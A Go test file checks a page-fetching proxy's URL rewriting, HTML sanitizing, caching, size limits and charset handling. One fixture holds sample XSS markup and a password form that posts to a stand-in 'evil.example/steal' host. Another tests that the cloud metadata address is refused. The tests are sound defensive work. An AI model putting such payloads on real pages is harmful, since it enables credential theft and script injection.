package pageproxy

import (
	"context"
	"errors"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync/atomic"
	"testing"
)

// prox is a recognisable stand-in for the real capability minter.
func prox(abs string) string { return "/asset?u=" + url.QueryEscape(abs) }
func page(abs string) string { return "/p?u=" + url.QueryEscape(abs) }

func serve(t *testing.T, body string, opts ...func(http.ResponseWriter)) *httptest.Server {
	t.Helper()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		for _, o := range opts {
			o(w)
		}
		_, _ = w.Write([]byte(body))
	}))
	t.Cleanup(srv.Close)
	return srv
}

func fetcher(t *testing.T) *Fetcher {
	t.Helper()
	return New(Options{Dir: t.TempDir(), AllowPrivate: true})
}

// The property the whole tier rests on: after this runs, nothing in the
// document points at the origin any more. A single missed URL is a request the
// reader's blocked network makes and fails.
func TestNothingPointsAtTheOriginAfterwards(t *testing.T) {
	srv := serve(t, `<!doctype html><html><head>
<title>A Page</title>
<link rel="stylesheet" href="/style.css">
<style>.hero{background:url(/bg.png)}</style>
</head><body>
<img src="/hero.png" srcset="/hero.png 1x, /hero@2x.png 2x">
<p>Words</p>
<a href="/next">Next</a>
</body></html>`)

	p, err := fetcher(t).Get(context.Background(), srv.URL+"/article", prox, page)
	if err != nil {
		t.Fatalf("Get: %v", err)
	}
	// The origin's own host must not survive anywhere in the markup — not in a
	// src, not in a srcset candidate, not inside a CSS url().
	host := strings.TrimPrefix(srv.URL, "http://")
	if strings.Contains(p.HTML, host) {
		t.Errorf("the origin host survived in the output:\n%s", p.HTML)
	}
	for _, want := range []string{"/asset?u=", "/p?u="} {
		if !strings.Contains(p.HTML, want) {
			t.Errorf("missing %q in:\n%s", want, p.HTML)
		}
	}
	if p.Title != "A Page" {
		t.Errorf("title = %q", p.Title)
	}
}

// Scripts are the difference between a document and a program. Sanitize drops
// them; this is the test that says so at the seam rather than in a unit test of
// the policy.
func TestScriptsAndFormsAreGone(t *testing.T) {
	srv := serve(t, `<html><body>
<script>alert(1)</script>
<script src="/app.js"></script>
<form action="https://evil.example/steal"><input name="password"></form>
<div onclick="alert(2)">click</div>
<iframe src="https://evil.example/"></iframe>
<p>Real content</p>
</body></html>`)

	p, err := fetcher(t).Get(context.Background(), srv.URL+"/x", prox, page)
	if err != nil {
		t.Fatalf("Get: %v", err)
	}
	for _, gone := range []string{"<script", "alert(", "<form", "onclick", "<iframe", "evil.example"} {
		if strings.Contains(p.HTML, gone) {
			t.Errorf("%q survived sanitizing:\n%s", gone, p.HTML)
		}
	}
	if !strings.Contains(p.HTML, "Real content") {
		t.Errorf("the actual content was lost:\n%s", p.HTML)
	}
}

// Layout has to survive, or the feature delivers a wall of unstyled text and
// calls it a page. class/id/style are what every stylesheet selects on.
func TestLayoutAttributesSurvive(t *testing.T) {
	srv := serve(t, `<html><body>
<div class="wrapper" id="main" style="max-width:60em">
<article class="post"><h1>Headline</h1><p class="lede">Lede</p></article>
</div></body></html>`)

	p, err := fetcher(t).Get(context.Background(), srv.URL+"/x", prox, page)
	if err != nil {
		t.Fatalf("Get: %v", err)
	}
	for _, want := range []string{`class="wrapper"`, `id="main"`, "max-width:60em", `class="lede"`} {
		if !strings.Contains(p.HTML, want) {
			t.Errorf("missing %q — the page will render unstyled:\n%s", want, p.HTML)
		}
	}
}

// <base href> retargets every relative URL. Sanitize does not allow the tag, so
// rewriting has to happen first — this is the test that pins that ordering.
func TestBaseHrefIsHonouredDespiteSanitizeDroppingIt(t *testing.T) {
	srv := serve(t, `<html><head><base href="https://cdn.example/assets/"></head>
<body><img src="pic.png"></body></html>`)

	p, err := fetcher(t).Get(context.Background(), srv.URL+"/x", prox, page)
	if err != nil {
		t.Fatalf("Get: %v", err)
	}
	if !strings.Contains(p.HTML, url.QueryEscape("https://cdn.example/assets/pic.png")) {
		t.Fatalf("base href was not honoured — sanitize ran before rewrite:\n%s", p.HTML)
	}
	if strings.Contains(p.HTML, "<base") {
		t.Errorf("base survived into the output:\n%s", p.HTML)
	}
}

// Relative URLs resolve against where the fetch LANDED, not where it was aimed.
func TestRelativeURLsResolveAgainstTheFinalURL(t *testing.T) {
	dest := serve(t, `<html><body><img src="pic.png"></body></html>`)
	var redirector *httptest.Server
	redirector = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, dest.URL+"/deep/page.html", http.StatusFound)
	}))
	defer redirector.Close()
	_ = redirector

	p, err := fetcher(t).Get(context.Background(), redirector.URL+"/start", prox, page)
	if err != nil {
		t.Fatalf("Get: %v", err)
	}
	if !strings.Contains(p.HTML, url.QueryEscape(dest.URL+"/deep/pic.png")) {
		t.Fatalf("resolved against the requested URL rather than the final one:\n%s\nfinal=%s",
			p.HTML, p.FinalURL)
	}
}

func TestNonHTMLIsRefused(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "application/pdf")
		_, _ = w.Write([]byte("%PDF-1.4"))
	}))
	defer srv.Close()

	_, err := fetcher(t).Get(context.Background(), srv.URL+"/doc.pdf", prox, page)
	if !errors.Is(err, ErrNotHTML) {
		t.Fatalf("err = %v, want ErrNotHTML", err)
	}
}

func TestUpstreamErrorIsReported(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		http.Error(w, "nope", http.StatusForbidden)
	}))
	defer srv.Close()

	_, err := fetcher(t).Get(context.Background(), srv.URL+"/x", prox, page)
	if !errors.Is(err, ErrUpstream) {
		t.Fatalf("err = %v, want ErrUpstream", err)
	}
}

func TestSizeCapIsEnforced(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		buf := make([]byte, 4096)
		for range 32 {
			_, _ = w.Write(buf)
		}
	}))
	defer srv.Close()

	f := New(Options{Dir: t.TempDir(), AllowPrivate: true, MaxBytes: 8 << 10})
	if _, err := f.Get(context.Background(), srv.URL+"/big", prox, page); !errors.Is(err, ErrTooLarge) {
		t.Fatalf("err = %v, want ErrTooLarge", err)
	}
}

// The cache holds the RAW page, so a second view re-mints fresh capabilities
// rather than replaying expiring ones — while still not re-fetching.
func TestCacheReusesTheFetchButRemintsTheURLs(t *testing.T) {
	var hits atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		hits.Add(1)
		w.Header().Set("Content-Type", "text/html")
		_, _ = w.Write([]byte(`<html><body><img src="/a.png"></body></html>`))
	}))
	defer srv.Close()

	f := fetcher(t)
	first, err := f.Get(context.Background(), srv.URL+"/x", prox, page)
	if err != nil {
		t.Fatalf("first: %v", err)
	}
	if !first.Fetched {
		t.Error("first call should report a network fetch")
	}

	n := 0
	stamped := func(abs string) string { n++; return "/asset?v=2&u=" + url.QueryEscape(abs) }
	second, err := f.Get(context.Background(), srv.URL+"/x", stamped, page)
	if err != nil {
		t.Fatalf("second: %v", err)
	}
	if hits.Load() != 1 {
		t.Errorf("origin hit %d times; the cache did not serve the second view", hits.Load())
	}
	if second.Fetched {
		t.Error("second call should report a cache hit")
	}
	if n == 0 || !strings.Contains(second.HTML, "v=2") {
		t.Errorf("cached page replayed stale capabilities instead of re-minting:\n%s", second.HTML)
	}
}

func TestBlockedAddressIsRefused(t *testing.T) {
	f := New(Options{Dir: t.TempDir()}) // AllowPrivate off
	if _, err := f.Get(context.Background(), "http://169.254.169.254/latest/meta-data/", prox, page); err == nil {
		t.Fatal("the metadata endpoint must never be fetchable")
	}
}

func TestNonUTF8PageIsDecodedOnce(t *testing.T) {
	// Windows-1252 é is a single 0xE9 byte. Decoded once it is "café";
	// decoded twice it is "cafÃ©", which is the bug the feed corpus found.
	body := append([]byte(`<html><head><meta charset="windows-1252"></head><body><p>caf`),
		0xE9, '<', '/', 'p', '>', '<', '/', 'b', 'o', 'd', 'y', '>', '<', '/', 'h', 't', 'm', 'l', '>')
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=windows-1252")
		_, _ = w.Write(body)
	}))
	defer srv.Close()

	p, err := fetcher(t).Get(context.Background(), srv.URL+"/x", prox, page)
	if err != nil {
		t.Fatalf("Get: %v", err)
	}
	if !strings.Contains(p.HTML, "café") {
		t.Errorf("expected café, got:\n%s", p.HTML)
	}
	if strings.Contains(p.HTML, "cafÃ©") {
		t.Errorf("double-decoded:\n%s", p.HTML)
	}
}
